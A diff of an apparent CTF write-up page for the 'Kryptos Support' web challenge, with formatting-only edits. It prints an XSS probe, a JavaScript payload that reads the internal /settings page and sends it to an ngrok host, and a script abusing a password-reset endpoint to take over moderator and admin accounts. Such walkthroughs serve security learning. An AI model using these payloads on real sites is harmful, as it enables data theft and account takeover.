@@ -233,9 +233,9 @@
 </tbody>
 </table>
 <h2 id="discovery-">Discovery :</h2>
-<p>This easy challenge are introduced with this page  , as we see just add a report issue interface:</p>
+<p>This easy challenge are introduced with this page , as we see just add a report issue interface:</p>
 <p><img src="/media/CTFs/Kryptos-Support/20220517090100.png" alt="image"></p>
-<p>There is also end point <code>/login</code>  But there is no <code>/signup</code> or <code>register</code></p>
+<p>There is also end point <code>/login</code> But there is no <code>/signup</code> or <code>register</code></p>
 <p><img src="/media/CTFs/Kryptos-Support/20220517090146.png" alt="image"></p>
 <p>and First thing i have tried is to get xss , i used xsshunter as a proof only latter on will use ngrok http server :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">https://XXXXXXX.xss.ht</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
@@ -252,12 +252,12 @@
 <h2 id="attacking-">Attacking :</h2>
 <p>I wanted to get an overview about what functions are there in the <code>/settings</code> page. so we craft this payload :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
-<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;http://127.0.0.1:1337/settings&#34;</span>);
-<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>);
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">exfil</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
-    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;http://3bbd-156-194-235-84.ngrok.io/?out=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">out</span>);
-    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">send</span>();
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://127.0.0.1:1337/settings&#34;</span>);
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>);
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">exfil</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+  <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://3bbd-156-194-235-84.ngrok.io/?out=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">out</span>);
+  <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">send</span>();
 };
 <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
 </code></pre></div><p>and will use this payload at the report page to request the script we host :</p>
@@ -309,12 +309,12 @@
 
     <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#update-btn&#39;</span>).<span style="color:#a6e22e">prop</span>(<span style="color:#e6db74">&#39;disabled&#39;</span>, <span style="color:#66d9ef">false</span>);
 }
-</code></pre></div><p>The catch here is that it doesn&rsquo;t check the old password , just providing the uid and the new password  will reset the password. we can confirm with this script which will reset the password of the moderator user</p>
+</code></pre></div><p>The catch here is that it doesn&rsquo;t check the old password , just providing the uid and the new password will reset the password. we can confirm with this script which will reset the password of the moderator user</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">theUrl</span> <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:1337/api/users/update&#34;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">theUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:1337/api/users/update&#34;</span>;
 <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#a6e22e">theUrl</span>);
 <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/json;charset=UTF-8&#34;</span>);
-<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;testme123&#34;</span>,<span style="color:#e6db74">&#39;uid&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;100&#39;</span>}));
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;testme123&#34;</span>, <span style="color:#a6e22e">uid</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;100&#34;</span> }));
 </code></pre></div><p>And we have successfully logged in with the new password and the username <code>moderator</code> :</p>
 <p><img src="/media/CTFs/Kryptos-Support/20220517092343.png" alt="image"></p>
 <p>Now why not reset the password for the user <strong><code>admin</code></strong> too ? , as it doesn&rsquo;t check on the <code>uid</code> , we can run intruder to fuzz the admin uid But for our luck it is <strong><code>1</code></strong> . from the moderator account we can reset the password without the need to use javascript code and ngrok hosting it</p>
